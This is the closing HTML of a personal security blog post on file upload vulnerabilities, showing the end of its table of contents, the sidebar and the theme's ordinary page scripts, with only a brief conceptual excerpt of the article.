href="#44-%E9%98%B2%E5%BE%A1%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.4.</span> <span class="toc-text"> 4.4 防御问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text"> 五、实战总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#51-%E5%9F%BA%E7%A1%80%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 5.1 基础上传利用步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#52-%E4%B8%8D%E5%90%8C%E6%A3%80%E6%9F%A5%E7%9A%84%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 5.2 不同检查的应对策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#53-%E5%85%B3%E9%94%AE%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">1.5.3.</span> <span class="toc-text"> 5.3 关键排查思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD-%E6%8B%93%E5%B1%95%E5%86%85%E5%AE%B9"><span class="toc-number">1.6.</span> <span class="toc-text"> 六、拓展内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#61-%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 6.1 其他绕过技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#62-%E9%98%B2%E5%BE%A1%E5%8A%A0%E5%9B%BA%E6%96%B9%E6%A1%88"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 6.2 防御加固方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#63-%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E6%96%B9%E5%90%91"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 6.3 进阶学习方向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64-%E5%BF%AB%E9%80%9F%E8%87%AA%E6%A3%80"><span class="toc-number">1.6.4.</span> <span class="toc-text"> 6.4 快速自检</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%BD%95%E5%B8%B8%E7%94%A8-payload-%E9%9B%86%E5%90%88"><span class="toc-number">1.7.</span> <span class="toc-text"> 附录：常用 Payload 集合</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+  
+<script src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js" integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE&#x2F;jMSCxD+jAPU55x&#x2F;jj3wlf" crossorigin="anonymous"></script>
+
+  
+<script src="/js/pjax.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@3.0.1/dist/quicklink.umd.js" integrity="sha384-caMDqvgav&#x2F;HWdEYQU1QRRHMLleigpL1YHAG0m371DhzfL8rRzUyOb+bEHtwlmYjD" crossorigin="anonymous"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Cl1ck-t0",
+          title: "文件上传漏洞",
+          url: "https://cl1ck-t0.github.io/2026/08/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
+          excerpt: "",
+          description: "",
+          stripContent: " 文件上传漏洞  一、前置知识  1.1 文件上传漏洞概述 什么是文件上传漏洞？  网站允许用户上传文件（头像、附件、图片等） 如果服务端未严格检查，攻击者可上传恶意脚本 当 Web 服务器解析执行该脚本时，就形成了漏洞  核心思想：  上传成功 ≠ 利用成功  完整的攻击链需要四步： 1上传 → 保存 → 访问 → 解析  1.2 HTTP 上传请求基础 multipart/form-data  HTML 上传文件时的编码类型 示例：  123&amp;lt;form method=&amp;quot;pos",
+          date: "Mon Aug 17 2026 16:44:45 GMT+0800",
+          updated: "Mon Aug 17 2026 17:27:43 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+        
+<script src="https://npm.webcache.cn/@zumer/snapdom@1.9.14/dist/snapdom.min.js" integrity="sha384-OEQ+fJp&#x2F;Mvi2uzBREXybtxryJvLytWapuHu4EE6LPwTKUwATYcc55tPPcZTzVcmx" crossorigin="anonymous" defer data-pjax></script>
+
+        
+<script src="https://npm.webcache.cn/qrcode@1.5.1/build/qrcode.js" integrity="sha384-VT1EeewTCEXgndcPMQ0PzV+uVFYjxFIjmAA7s5gcMX9t4Dt5TD+OVQIn7NJWIXn7" crossorigin="anonymous" defer data-pjax></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'Cl1ck-t0/Cl1ck-t0.github.io');
+        script.setAttribute('issue-term', 'title');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+    <script>
+      var setupAPlayer = () => {
+        if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+          if (window.matchMedia('(max-width: 959px)').matches) {
+            const meting = _$('meting-js');
+            if (meting) {
+              meting.setAttribute('fixed', 'true');
+              const aside = meting.parentNode?.parentNode;
+              if (aside?.tagName === 'ASIDE') {
+                meting.parentNode.removeChild(meting);
+                document.body.appendChild(meting);
+              }
+            }
+          }
+        }
+      };
+    </script>
+  
+<script src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js" integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr+h5UfruuRL&#x2F;aORyw+5+HZoU6e" crossorigin="anonymous" defer onload="setupAPlayer()"></script>
+
+    
+<script src="https://npm.webcache.cn/meting@2.0.1/dist/Meting.min.js" integrity="sha384-ASVlpKF80A22OXTK3tfEjZm1EL6uFMKIC4p8+0maanw1S&#x2F;IyB+Y4JG+ZDU7GpKE8" crossorigin="anonymous" defer></script>
+
+
+
+  </body>
+  </html>
